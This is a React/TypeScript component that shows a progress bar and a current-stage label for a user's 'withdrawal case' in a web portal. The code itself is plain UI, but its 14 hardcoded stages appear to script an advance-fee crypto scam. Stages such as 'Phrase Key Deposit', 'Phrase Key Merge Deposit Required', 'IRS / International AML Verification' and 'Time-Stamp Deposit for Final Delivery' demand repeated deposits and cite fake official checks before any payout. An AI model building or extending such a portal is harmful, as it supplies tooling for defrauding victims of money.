import { motion } from "framer-motion";
import { TrendingUp, ChevronRight } from "lucide-react";
import { usePortal } from "@/pages/portal/PortalContext";

const WITHDRAWAL_STAGE_LABELS: { id: number; label: string; icon: string }[] = [
  { id: 1, label: "Phrase Key Deposit Received", icon: "💰" },
  { id: 2, label: "Generating Secure Phrase Key", icon: "⚙️" },
  { id: 3, label: "Phrase Key Approved & Available", icon: "🔐" },
  { id: 4, label: "Withdrawal Process Initiated", icon: "🚀" },
  { id: 5, label: "Initial Deposit Verification", icon: "✅" },
  { id: 6, label: "Phrase Key Verification", icon: "🔑" },
  { id: 7, label: "Phrase Key Merge Deposit Required", icon: "📊" },
  { id: 8, label: "Financial Department Verification", icon: "🏦" },
  { id: 9, label: "Mining Withdrawal for Final Clearance", icon: "⛏️" },
  { id: 10, label: "Blockchain Activity Verification", icon: "🔗" },
  { id: 11, label: "IRS / International AML Verification", icon: "🏛️" },
  { id: 12, label: "Final Withdrawal Processing", icon: "📋" },
  { id: 13, label: "Withdrawal Successfully Released", icon: "🎉" },
  { id: 14, label: "Time-Stamp Deposit for Final Delivery", icon: "⏰" },
];

const TOTAL_STAGES = WITHDRAWAL_STAGE_LABELS.length;

export function PortalProgressStrip() {
  const { currentCase, viewState, setViewState } = usePortal();

  if (!currentCase) return null;

  const rawStage = currentCase.withdrawalStage ?? "1";
  const parsed = parseInt(rawStage, 10);
  const currentStage = Number.isFinite(parsed)
    ? Math.min(Math.max(parsed, 1), TOTAL_STAGES)
    : 1;

  const progressPercent = Math.min(
    100,
    Math.round((currentStage / TOTAL_STAGES) * 100),
  );
  const stageData =
    WITHDRAWAL_STAGE_LABELS.find((s) => s.id === currentStage) ??
    WITHDRAWAL_STAGE_LABELS[0];
  const isOnDashboard = viewState === "dashboard";
  const isComplete = currentStage >= TOTAL_STAGES;

  return (
    <div
      className="border-b border-white/10"
      style={{
        background:
          "linear-gradient(90deg, rgba(10,20,60,0.85) 0%, rgba(10,20,60,0.7) 100%)",
        backdropFilter: "blur(16px)",
      }}
      data-testid="portal-progress-strip"
      role="region"
      aria-label="Your case progress"
    >
      <button
        type="button"
        onClick={() => {
          if (!isOnDashboard) setViewState("dashboard");
        }}
        disabled={isOnDashboard}
        className={`w-full max-w-screen-2xl mx-auto px-4 py-2.5 flex items-center gap-3 ${
          isOnDashboard
            ? "cursor-default"
            : "hover:bg-white/5 transition-colors cursor-pointer"
        }`}
        data-testid="button-portal-progress-strip"
        title={
          isOnDashboard
            ? "Your case progress"
            : "Tap to view full progress on your dashboard"
        }
      >
        <div className="w-7 h-7 rounded-lg bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center shrink-0 shadow">
          <TrendingUp className="w-3.5 h-3.5 text-white" />
        </div>

        <div className="flex-1 min-w-0">
          <div className="flex items-baseline gap-2 mb-1">
            <span className="text-[10px] uppercase tracking-widest text-blue-300 font-bold shrink-0">
              {isComplete ? "Process complete" : "Your process"}
            </span>
            <span
              className="text-[10px] text-blue-400/80 font-mono shrink-0"
              data-testid="text-progress-stage-count"
            >
              Stage {currentStage} / {TOTAL_STAGES}
            </span>
            <span
              className="text-[11px] font-bold text-blue-300 ml-auto shrink-0"
              data-testid="text-progress-percent"
              aria-live="polite"
            >
              {progressPercent}%
            </span>
          </div>

          <div
            className="h-1.5 bg-slate-800/80 rounded-full overflow-hidden"
            role="progressbar"
            aria-valuenow={progressPercent}
            aria-valuemin={0}
            aria-valuemax={100}
            aria-label={`Process progress: ${progressPercent}% — currently ${stageData.label}`}
          >
            <motion.div
              className={`h-full rounded-full ${
                isComplete
                  ? "bg-gradient-to-r from-emerald-500 to-emerald-400"
                  : "bg-gradient-to-r from-blue-500 via-blue-600 to-indigo-500"
              }`}
              initial={false}
              animate={{ width: `${progressPercent}%` }}
              transition={{ duration: 0.8, ease: "easeOut" }}
            />
          </div>

          <div className="flex items-center gap-1.5 mt-1">
            <span className="text-sm shrink-0" aria-hidden="true">
              {stageData.icon}
            </span>
            <span
              className="text-xs text-white font-medium truncate"
              data-testid="text-progress-current-label"
            >
              {stageData.label}
            </span>
          </div>
        </div>

        {!isOnDashboard && (
          <ChevronRight className="w-4 h-4 text-blue-300/60 shrink-0" />
        )}
      </button>
    </div>
  );
}

export default PortalProgressStrip;
